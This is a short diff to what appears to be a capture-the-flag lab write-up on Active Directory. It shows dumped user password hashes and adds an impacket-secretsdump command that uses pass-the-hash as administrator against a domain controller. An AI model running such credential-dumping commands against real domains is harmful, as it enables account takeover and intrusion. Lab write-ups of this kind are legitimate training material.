@@ -59,3 +59,9 @@ Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527
 support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
 [*] Cleaning up..
 ```
+
+Authenticated dumping
+
+```
+impacket-secretsdump -dc-ip 10.113.155.93 THM.LOCAL/administrator@thm.local -hashes aad3b435b51404eeaad3b435b51404ee:07d677a6cf40925beb80ad6428752322
+```
